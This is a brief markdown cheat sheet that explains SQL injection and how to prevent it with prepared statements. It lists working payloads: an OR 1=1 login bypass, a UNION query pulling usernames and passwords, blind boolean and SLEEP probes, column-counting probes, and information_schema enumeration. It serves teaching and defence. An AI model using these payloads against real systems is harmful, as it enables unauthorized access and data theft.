# SQL Injection (SQLi)

## What is SQL Injection?

SQL Injection is a web vulnerability that allows attackers to manipulate SQL queries executed by a database.

---

## Why It Happens

Unsafe Query:

SELECT * FROM users WHERE username = '$input';

Attacker Input:

' OR 1=1 --

Result:

SELECT * FROM users WHERE username='' OR 1=1 --';

The condition becomes TRUE and returns all records.

---

## Types of SQL Injection

### 1. UNION Based SQLi

Used to retrieve data from other tables.

Example:

' UNION SELECT username,password FROM users--

---

### 2. Error Based SQLi

Uses database errors to leak information.

---

### 3. Boolean Blind SQLi

' AND 1=1--

' AND 1=2--

---

### 4. Time Based Blind SQLi

' AND SLEEP(5)--

---

## Determining Number of Columns

ORDER BY Method

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

UNION NULL Method

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

---

## Database Enumeration

Find Tables:

SELECT * FROM information_schema.tables;

Find Columns:

SELECT * FROM information_schema.columns;

Find Version:

MySQL:
SELECT @@version;

Oracle:
SELECT * FROM v$version;

PostgreSQL:
SELECT version();

---

## SQL Injection Locations

- URL Parameters
- Login Forms
- Search Boxes
- Cookies
- JSON
- XML
- HTTP Headers

---

## Prevention

Use Prepared Statements.

Example:

PreparedStatement statement =
connection.prepareStatement(
"SELECT * FROM users WHERE username = ?"
);

---

## Impact

- Authentication Bypass
- Data Theft
- Privilege Escalation
- Database Compromise

---

## Tools

- Burp Suite
- SQLMap
- OWASP ZAP
